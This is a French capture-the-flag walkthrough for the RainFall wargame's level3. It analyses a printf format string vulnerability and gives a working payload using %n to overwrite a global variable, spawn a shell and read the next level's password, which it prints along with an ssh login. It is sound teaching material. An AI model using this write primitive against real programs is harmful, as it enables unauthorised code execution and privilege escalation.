# level3: Exploitation d'une Vulnérabilité de Format de Chaîne

## Aperçu du Challenge

Dans ce challenge, nous devons exploiter un binaire pour accéder au mot de passe du niveau suivant. Le binaire contient une fonction `v()` qui lit l'entrée de l'utilisateur, l'affiche, puis vérifie si une variable globale `m` est égale à `0x40`. Si la condition est remplie, le programme exécute une commande shell pour donner accès au niveau suivant.

## Analyse du Code Source

Le code source du binaire est le suivant:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

uint32_t m = 0x00000000; // Variable globale stockée à l'adresse 0x804988c

void v(void) {
    char buffer[520];

    // Lire l'entrée depuis stdin
    fgets(buffer, sizeof(buffer), stdin);

    // Afficher l'entrée sur stdout
    // printf("%s", buffer); Code initial de Ghidra, le code initial n'utilisait en fait pas de spécificateurs de type
    printf(buffer);

    // Vérifier si la condition est remplie
    if (m == 0x40) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

int main(void) {
    v();
    return 0;
}
```

Initialement, lors de l'analyse du binaire dans Ghidra, le décompilateur a montré la ligne `printf("%s", buffer);`. C'est une façon sécurisée d'utiliser `printf` car elle spécifie explicitement la chaîne de format. Cependant, en testant le binaire avec l'entrée `%x %x %x`, nous avons obtenu la sortie suivante:

```
level3@RainFall:~$ ./level3
%x %x %x
200 b7fd1ac0 b7ff37d0
```

Cette sortie indique que le binaire utilise en réalité `printf(buffer);`, ce qui le rend vulnérable à une attaque de chaîne de format. Ghidra avait supposé la version sécurisée du code, mais le binaire réel n'inclut pas le spécificateur de format.

## Vulnérabilité

La vulnérabilité réside dans l'utilisation de `printf(buffer);`. Lorsque `printf` est appelé sans spécificateur de format, il interprète le contenu de `buffer` comme une chaîne de format. Cela permet à un attaquant de:

1. Lire des adresses mémoire arbitraires en utilisant `%x` ou `%s`.
2. Écrire à des adresses mémoire arbitraires en utilisant `%n`.

## Exploitation

Pour exploiter cette vulnérabilité, nous devons:

1. Écrire la valeur `0x40` (64 en décimal) dans la variable globale `m`, située à l'adresse `0x804988c`.
2. Utiliser le spécificateur de format `%n` pour y parvenir.

### Qu'est-ce que `%n`?

Le spécificateur de format `%n` dans `printf` écrit le nombre de caractères imprimés jusqu'à présent à l'adresse mémoire fournie comme argument. Par exemple:

```c
int x = 0;
printf("Hello, world!%n", &x);
```

Après l'exécution de ce code, `x` contiendra la valeur `13` car 13 caractères ont été imprimés avant que `%n` ne soit traité.

### Qu'est-ce que `%c`?

Le spécificateur de format `%c` imprime un seul caractère. Il est utile pour contrôler le nombre de caractères imprimés, car chaque `%c` ajoute exactement un caractère à la sortie.

### Comment `printf` Trouve-t-il des Arguments Quand Aucun n'est Fourni?

Lorsque `printf` est appelé, il cherche des arguments sur la pile. Si aucun argument n'est explicitement fourni, `printf` tentera néanmoins de les récupérer sur la pile, interprétant les valeurs qu'il y trouve comme des arguments. Ce comportement est ce qui rend possibles les vulnérabilités de chaîne de format. Par exemple:

```c
level3@RainFall:~$ ./level3
%x %x %x
200 b7fd1ac0 b7ff37d0
```

Dans ce cas, `printf` affichera les valeurs des trois premières entrées de la pile qu'il rencontre, bien qu'aucun argument n'ait été passé.

### Déterminer la Position Correcte du Paramètre

Pour exploiter la vulnérabilité de chaîne de format, nous devions déterminer quelle position de paramètre sur la pile correspond à l'adresse de la variable globale `m` (0x804988c). C'est crucial pour utiliser le spécificateur de format `%n` afin d'écrire à l'emplacement mémoire correct.

#### Test de la Disposition de la Pile

Nous avons utilisé le code d'exploitation suivant pour afficher plusieurs valeurs de la pile:

```bash
(python -c 'print "\x8c\x98\x04\x08" + " %x %x %x %x %x %x %x %x"') | ./level3
```

Ce code d'exploitation:

1. Place l'adresse de `m` (`0x804988c`, `\x8c\x98\x04\x08` en petit-boutien) au début de l'entrée. Consultez le walkthrough du niveau 1 pour plus de détails sur le format petit-boutien.
2. Inclut plusieurs spécificateurs de format `%x` pour afficher les valeurs de la pile.

#### Analyse de la Sortie

La sortie du test était:

```
� 200 b7fd1ac0 b7ff37d0 804988c 20782520 25207825 78252078 20782520
```

En décomposant:

- `200`: Première valeur de la pile.
- `b7fd1ac0`: Deuxième valeur de la pile.
- `b7ff37d0`: Troisième valeur de la pile.
- `804988c`: **Quatrième valeur de la pile** (l'adresse de `m`).

Cela a confirmé que l'adresse de `m` est à la 4ème position de paramètre sur la pile.

#### Code d'exploitation Final

Avec cette information, nous avons mis à jour notre code d'exploitation pour utiliser `%4$n` afin d'écrire à l'adresse de `m`:

```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
```

Ce code d'exploitation:

1. Place l'adresse de `m` au début de l'entrée. Cela est nécessaire pour que l'adresse soit disponible comme 4ème paramètre dans la fonction `printf`.
2. Imprime 60 caractères pour porter le nombre total de caractères à 64.
3. Utilise `%4$n` pour écrire le nombre de caractères (64) à l'adresse de `m`.

#### Vérification de l'Exploit

L'exécution du code d'exploitation mis à jour a produit la sortie suivante:

```
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
�
Wait what?!
```

Cela a confirmé que la valeur `0x40` (64 en décimal) a été écrite avec succès dans `m`, déclenchant la condition pour exécuter la commande shell.

### Livraison de l'Exploit

Nous pouvons livrer le code d'exploitation en utilisant Python:

```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
```

Cette commande:

- Génère le code d'exploitation.
- La transmet au binaire.
- Utilise `cat` pour maintenir stdin ouvert pour l'interaction avec le shell. Consultez le walkthrough du niveau 1 pour plus de détails.

### Vérification de l'Exploit

L'exécution de l'exploit produit la sortie suivante:

```
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
�
Wait what?!
```

Cela confirme que la valeur `0x40` a été écrite avec succès dans `m`, déclenchant la condition pour exécuter la commande shell.

## Obtention du Mot de Passe

Après avoir obtenu l'accès au shell, nous pouvons récupérer le mot de passe du niveau suivant:

```bash
cat /home/user/level4/.pass
```

Le mot de passe est:

```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Passage au Niveau Suivant

Utilisez le mot de passe pour vous connecter en tant que `level4`:

```bash
ssh level4@192.168.1.13 -p 4242
```
